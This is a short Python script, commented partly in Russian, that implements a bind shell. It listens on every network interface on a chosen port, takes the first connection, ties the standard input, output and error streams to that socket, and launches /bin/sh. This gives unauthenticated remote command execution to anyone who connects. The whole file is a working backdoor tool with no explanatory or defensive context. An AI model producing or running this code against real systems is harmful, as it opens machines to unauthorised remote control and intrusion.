import socket
import os
import sys

def bind_shell(port):
    host = '0.0.0.0'  # Прослушиваем все доступные интерфейсы
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f'Listening on {host}:{port}...')
        conn, addr = s.accept()
        print(f'Connection from {addr}')
        
        
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)

    
        os.system('/bin/sh')

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <port>")
        sys.exit(1)
    
    try:
        port = int(sys.argv[1])
        bind_shell(port)
    except ValueError:
        print("Error: Port must be an integer.")
        sys.exit(1)
